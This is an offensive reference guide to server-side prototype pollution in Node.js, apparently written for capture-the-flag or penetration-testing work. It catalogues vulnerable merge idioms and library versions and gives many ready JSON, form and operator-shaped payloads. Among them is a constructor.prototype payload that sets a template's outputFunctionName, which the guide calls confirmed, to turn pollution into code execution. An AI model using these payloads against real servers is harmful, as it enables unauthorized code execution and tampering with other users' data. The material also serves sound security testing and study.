# Server-side merge pollution (Node/JS) — the full surface

A JSON body that is merged — recursively assigned — into a server-side
object can write onto `Object.prototype` through `__proto__`, or onto
arbitrary keys through merge helpers that accept operator-shaped
input. This is the primary server-side carrier.

---

## 1. The merge-site taxonomy

Every merge is a function call with a signature. Name it before
choosing a payload:

| Merge idiom | What it looks like in source | The sink |
|---|---|---|
| `Object.assign(target, req.body)` | shallow only — `__proto__` lands as own property, no prototype write | safe by itself; becomes a sink via a second deep op |
| `_.merge(dest, req.body)` / `lodash.merge` | recursive, walks `__proto__` keys | THE classic sink — every lodash merge before 4.17.21 |
| `merge(dest, req.body)` (`merge` npm) | recursive, no key filtering | sink — used in config loaders |
| `merge-deep`, `deepmerge`, `deep-assign`, `defaults-deep`, `plain-object-merge` | small recursive helpers | sink — same class |
| `$.extend(true, dest, req.body)` | jQuery deep extend | sink |
| `for (k in obj) dest[k] = obj[k]` | hand-rolled with `for..in` | sink when no `hasOwnProperty` guard |
| `JSON.parse(req.body)` then recursive setter | `set(obj, path, val)` with dotted path | sink when path contains `__proto__` |
| `obj[a][b] = v` from split keys | `path.split('.')` walked | sink — `a="__proto__"` |
| `structuredClone`/spread `{...}` | copies own enumerable only | NOT a merge — `__proto__` is dropped |
| `Object.fromEntries` | own properties only | safe |

The `for..in` + no-`hasOwnProperty` pattern is the subtle one — it
copies `__proto__` as a KEY string (writable via `obj["__proto__"]`)
even when `obj.__proto__ = x` (the setter path) is sanitized.

## 2. The three write primitives

```json
{"__proto__": {"marker": 1}}
{"constructor": {"prototype": {"marker": 1}}}
{"__proto__.marker": 1}
```

- `__proto__` object-key: works when the merge assigns nested objects
  recursively — `dest.__proto__.marker = 1` fires the setter.
- `constructor.prototype`: survives `__proto__` string filters —
  `dest.constructor` is `Object`, `.prototype` is `Object.prototype`.
  The Chromatic bypass.
- dotted-path string: when the API takes a PATH (`$rename`, `set`,
  `deep-set`) rather than an object — `{"$rename": {"x":
  "__proto__.marker"}}` or `{"field": "__proto__.marker"}`.

Try all three per merge site; the filter almost always guards only
one form.

## 3. Probe shapes that worked

**Empty-filter merge** (Secure Notes): send an update containing only
your own note's filter and no content fields, and read the response.
Expected: the merge accepted `__proto__`-shaped or `$rename`-shaped
input and the response reflects a property your own object never
had — the write landed on the prototype, not your note. Falsifier:
the update is ignored or rejected for the operator shape; the merge
is not reachable.

```json
{"filter": {"id": "<your-note>"}, "__proto__": {"marker": "pp-probe"}}
```

Then GET any resource and look for `marker` on objects that never
carried it — the signature read is *a property appearing where it was
never set*.

**`$rename`/`$` operator shapes**: Mongo-style merges treat
`$`-prefixed keys as operators; a merge helper that does not strip
them lets `$rename`, `$set`-like or `$where`-shaped input act on
fields the API never exposed.

**The constructor.prototype deep path** — when `__proto__` is
sanitized, walk the other route:

```json
{"theme": {"constructor": {"prototype": {"outputFunctionName":
  "x;__append('[PP-MARKER]');var y"}}}}
```

(Chromatic Aberration — confirmed.) The `constructor` key survives
most `__proto__` filters and reaches `prototype` one level deeper;
the polluted key here was a template's `outputFunctionName`, turning
pollution into code execution when the function was later compiled.

## 4. The nested-depth question

`__proto__` at what depth? The merge assigns `dest.__proto__` only if
the walk reaches the root — but nested writes reach deeper:

```json
{"a": {"__proto__": {"m": 1}}}         — one level down
{"a": {"b": {"__proto__": {"m": 1}}}}  — deeper; often still resolves
{"__proto__": {"a": {"b": {"m": 1}}}}  — the proto-object itself nested
```

A merge that checks `key !== '__proto__'` at depth-0 only misses the
nested form. Sweep depths 1–3 before declaring the site closed.

## 5. Carrier variants of the same merge

The merge logic is carrier-agnostic — reach it through:

- **JSON body**: `{"__proto__": {...}}`
- **urlencoded form**: `__proto__[marker]=1` (qs parses the brackets
  into `{"__proto__": {"marker": "1"}}`)
- **query string**: `?__proto__[marker]=1` — same qs parse
- **multipart**: a form field literally named `__proto__.marker`
- **JSON-in-field**: `{"config": "{\"__proto__\":{\"m\":1}}"}` — the
  inner string is re-parsed by the config loader (second parse merges)
- **cookie value**: `Cookie: prefs={"__proto__":...}` when the app
  JSON-parses cookie contents
- **WebSocket frame**: `{"type":"update","data":{"__proto__":...}}`
- **GraphQL variables/input object**: `{"input":{"prefs":{"__proto__":
  ...}}}` — JSON.parse of variables reaches the same merge

`pp_probe.py --url <merge> --body <json> --readback <url>` covers the
JSON/form/query matrix; the exotic carriers are hand-crafted on the
same pattern.

## 6. The readback — how you know it landed

The write and the observation are different requests:

| Readback | What it proves |
|---|---|
| `GET /api/me` returns `{"marker": "pp"}` on your object | local write only — NOT prototype pollution |
| a FRESH object (new note, other user's doc) carries `marker` | prototype write — global |
| `GET /` on an unrelated route shows `marker` in JSON | global — every `{}` inherits it |
| `{}.marker` via an eval/admin console | direct confirm |
| the gate behaviour changes (403→200, render includes marker) | the FALLBACK read it — the payoff |

`pp_probe --readback <url>` runs the re-read. The marker must appear
on an object you did not write — that is the only proof of
prototype-level (vs own-property) pollution.

## 7. The local-write trap

`{"__proto__": {"m": 1}}` can also land as `dest.__proto__` where
`dest` is a plain object that is NOT shared — the response reflects
`m` because the serializer iterates `__proto__`'s own keys. That is
*not* pollution; nothing inherited. Discriminator: create a NEW object
after the write — if it lacks `marker`, the write was local.

## 8. Frozen/hardened merges — the denial

`Object.freeze(Object.prototype)`, `Object.create(null)` targets,
`Object.preventExtensions`, `Map` instead of `{}`, a merge that does
`hasOwnProperty` + key blacklist, `lodash` ≥ 4.17.21's own fix
(skipping `__proto__`/`constructor`/`prototype` key segments). Each is
a real denial — record which defense the response revealed:

- `{"__proto__":{...}}` echoed back as a literal own-property → parser
  treats it as data, not setter — merge never saw it.
- `marker` absent on fresh objects but present on the written one →
  local write, no prototype.
- 400/422 on `__proto__` key → explicit filter; try
  `constructor.prototype` and dotted-path before concluding.

## 9. Operator-shaped input beyond $rename

Merges that interpret `$` keys (mongoose update helpers, some config
loaders):

```json
{"$set": {"__proto__.m": 1}}
{"$rename": {"field": "__proto__.m"}}
{"$unset": {"__proto__.m": 1}}
{"$push": {"__proto__.m": 1}}
{"$merge": {"__proto__": {"m": 1}}}
{"$where": "this.__proto__.m = 1"}
{"$accumulator": {"init": "function(){}"}}
{"$function": {"body": "function(x){return x}"}}
{"filter": {"__proto__": {"m": 1}}, "update": {...}}
```

`$rename` is special: it writes the VALUE of one path to another —
the target path `__proto__.m` is where the pollution lands, and the
source value must exist first (the "create them first" trap in
SKILL.md).

## 10. Version pins to remember

| Library | Vulnerable until | Note |
|---|---|---|
| lodash `merge`/`defaultsDeep` | 4.17.21 | `__proto__`/`constructor`/`prototype` segments skipped after |
| `merge` npm | 2.1.1 | same fix |
| `merge-deep` | 3.0.3 | CVE-2021-25903-class |
| `deepmerge` | never had it | copies own props only — safe pattern |
| jQuery `$.extend` | 3.4.0 | `__proto__` key filtered |
| `node-extend` | 0.2.1 | old, still in vendored code |
| `mout` `deepFillIn`/`deepMixIn` | 1.2.3 | CVE class |
| `just-extend` | 4.0.2 | |
| `dset` | 3.1.4 | `dset(obj,"__proto__.x",v)` |
| `object-path` | 0.11.8 | `set(obj,"__proto__.x",v)` |
| `deep-extend` | 0.6.0 | |
| `extend` npm | never filtered | still lands `__proto__` writes |
| `minimist` | 1.2.6 | argv parse → `__proto__` key as data |
| `qs` (arrays>limit→proto) | 6.x historically | bracket nesting depth limits |

A vendored or bundled copy ignores the npm version — check
`bundle_miner.py` output or the lockfile via
`tools/gadget_lookup.py --lockfile <handout>/package-lock.json`.
